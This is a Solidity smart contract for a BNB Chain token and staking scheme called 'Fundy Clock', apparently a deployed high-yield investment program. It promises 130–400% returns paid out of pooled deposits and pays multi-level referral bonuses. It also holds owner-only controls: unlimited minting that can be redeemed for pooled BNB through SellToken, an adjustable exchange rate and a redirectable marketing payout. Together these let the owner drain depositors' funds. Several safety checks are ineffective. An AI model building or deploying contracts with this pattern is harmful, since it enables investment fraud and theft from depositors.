/**
 *Submitted for verification at BscScan.com on 2022-07-01
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.5.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract FundyClock is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;       
    }

    struct Player {
        uint256 dividends;
        uint256 total_staked;
        uint256 total_ref_bonus;
        uint256 total_harvested;
        uint256 total_sold;  
        uint256 total_bnb_deposit;        
        uint256 total_bnb_earned;        
        uint256[5] structure; 
        uint40 last_payout;
        Deposit[] deposits;
        address upline;
    }

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    address public marketing;
    
    uint256 public _totalSupply;
    uint8 public _decimals;
    string public _symbol;
    string public _name;
    
    uint256 public totalSales = 0; 
    uint256 public totalSoldTokens = 0;         
    uint256 public totalStaked; 
    uint256 public totalHarvested;  
    uint256 public totalWithdrawn; 
    uint256 public ref_bonus;     
    uint256 public bnbRate = 1000000; 
    uint8 constant LEVELS = 5;
    uint8 public isScheduled = 1;    
    uint16 constant PERCENT = 1000; 
    uint16[LEVELS] private ref_bonuses = [100, 50, 20, 20, 10]; 
    uint256 private constant DAY = 24 hours;
    uint256 public numDays = 5; 

    mapping(uint256 => Tarif) public tarifs;
    mapping(address => Player) public players;

    constructor() public {
        _name = "Fundy Clock";
        _symbol = "FUNDY";
        _decimals = 18;
        _totalSupply =  10000000000 * 10**uint(_decimals); 
        _balances[address(this)] = _totalSupply; 		    
        emit Transfer(address(0), address(this), _balances[address(this)]);    
        marketing = owner();
    
        tarifs[10] = Tarif(10, 130);                 
        tarifs[20] = Tarif(20, 180);                 
        tarifs[40] = Tarif(40, 400);
    }
 

    function StakeToken(address _upline, uint256 tarif) external payable {
	    Player storage player = players[msg.sender];
      
      _setUpline(msg.sender, _upline);
       
      require(msg.value >= 0.05 ether, "Minimum investment is 0.05 BNB");
      uint256 tokenAmount = msg.value.mul(bnbRate);
                
      player.deposits.push(Deposit({
          tarif: tarif,
          amount: tokenAmount,
          time: uint40(block.timestamp)                
      }));
      player.total_bnb_deposit += msg.value;
        
      totalSales = totalSales.add(msg.value);
      totalSoldTokens = totalSoldTokens.add(tokenAmount);

      uint256 shares = msg.value.div(10);        
      address payable addr1 = address(uint160(marketing));
      addr1.transfer(shares);
      totalWithdrawn += shares;

      player.total_staked += tokenAmount;
      totalStaked += tokenAmount;
      _refPayout(msg.sender, msg.value);

      uint256 t =  tokenAmount * 10 / PERCENT;  
      
      require(_balances[address(this)] - t >= 0,"Not Enough Yields!");
      _balances[address(this)] = _balances[address(this)].sub(t);
      _balances[msg.sender] = _balances[msg.sender].add(t);
      emit Transfer(address(this), msg.sender, t);

  }

  function HarvestYields() external {
        Player storage player = players[msg.sender];    
        _payout(msg.sender);

        if(isScheduled == 1) {
            require (block.timestamp >= (player.last_payout + (DAY * numDays)), "Not due yet for next harvest!");
        }

        require(player.dividends > 0, "No Yields Yet!");
        uint256 dustCollected = player.dividends;
        
        player.dividends = 0; 
      
        player.total_harvested += dustCollected;
        totalHarvested += dustCollected;
        uint256 bnb = dustCollected.div(bnbRate);
     
        address payable addr = address(uint160(msg.sender));
        addr.transfer(bnb);

        totalWithdrawn += bnb;
        
        player.total_sold += dustCollected;
        player.total_bnb_earned += bnb;
    }
    
    function Reinvest(address _upline, uint256 t) external {
        Player storage player = players[msg.sender];    
        _payout(msg.sender);

        require(player.dividends > 0, "No Yields Yet!");
        uint256 tokenamount = player.dividends;
        player.dividends = 0; 
       
        player.total_harvested += tokenamount;
        totalHarvested += tokenamount;
        
        _setUpline(msg.sender, _upline);
        
        player.deposits.push(Deposit({
          tarif: t,
          amount: tokenamount,
          time: uint40(block.timestamp)
        }));
              
        player.total_staked += tokenamount;
        totalStaked += tokenamount;
    }    

    function SellToken(uint256 tokenamount) external {
        Player storage player = players[msg.sender];    
        require(_balances[msg.sender] - tokenamount >= 0,"Not Enough Yields to Sell!");

        _balances[msg.sender] = _balances[msg.sender].sub(tokenamount);
        _balances[address(this)] = _balances[address(this)].add(tokenamount);
        emit Transfer(msg.sender, address(this), tokenamount);

        uint256 bnb = tokenamount.div(bnbRate); 
        address payable addr = address(uint160(msg.sender));
        addr.transfer(bnb);

        totalWithdrawn += bnb;
        
        player.total_sold += tokenamount;
        player.total_bnb_earned += bnb;
    }

    function sendYields(address _dest) external {
        Player storage myAcct = players[msg.sender];
        Player storage dest = players[_dest];
        
        _payout(msg.sender);
        _payout(_dest);

        require(myAcct.dividends > 0, "No Yields Yet!");
        uint256 amount = myAcct.dividends;
        dest.dividends = dest.dividends + amount;
        myAcct.dividends = 0;
        myAcct.total_harvested += amount;
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT;
            
            address payable addr = address(uint160(up));
            addr.transfer(bonus);

            uint256 b = bonus.mul(bnbRate);
            players[up].total_ref_bonus += b;

            ref_bonus += b;
            totalWithdrawn += bonus;
			     
            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner();
            }

            players[_addr].upline = _upline;
            
            for(uint8 i = 0; i < LEVELS; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }   
    
	
    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            
            Deposit storage dep = player.deposits[i];
            
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
              value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }            
        }

        return value;
    }

    function nextHarvestTime(address _addr) view external returns(uint40 next_sked) {
        Player storage player = players[_addr];
        if(player.deposits.length > 0)
        {
          return uint40(player.last_payout + (DAY * numDays));
        }
        return 0;
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_harvested, 
        uint256 total_sold, uint256 total_ref_bonus,  uint256 total_bnb_deposit, uint256 total_bnb_earned, uint256[LEVELS] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends,
            player.total_staked, player.total_harvested, player.total_sold, player.total_ref_bonus, player.total_bnb_deposit, player.total_bnb_earned, structure);
    }

    function contractInfo() view external returns(uint256 _sales, uint256 _invested, uint256 _harvested, uint256 _withdrawn, uint256 _ref_bonus) {
        return (totalSales, totalStaked, totalHarvested, totalWithdrawn, ref_bonus);
    }

    function setScheduled(uint8 newval) public onlyOwner returns (bool) {       
        isScheduled = newval;
        return true;
    }
    
    function setDays(uint newval) public onlyOwner returns (bool) {       
        numDays = newval;
        return true;
    }
	
   	function setMarketing(address _addr)  public onlyOwner returns (bool) {       
        marketing = _addr;
        return true;
    }

    function setBNBRate(uint newval) public onlyOwner returns (bool success) {
       bnbRate = newval;
       return true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function decimals() external view returns (uint8) {
        return _decimals;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
        return true;
    }

    function mint(uint256 amount, address receiver) public onlyOwner returns (bool) {
        _mint(receiver, amount);
        return true;
    }

    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }
  
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }

}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}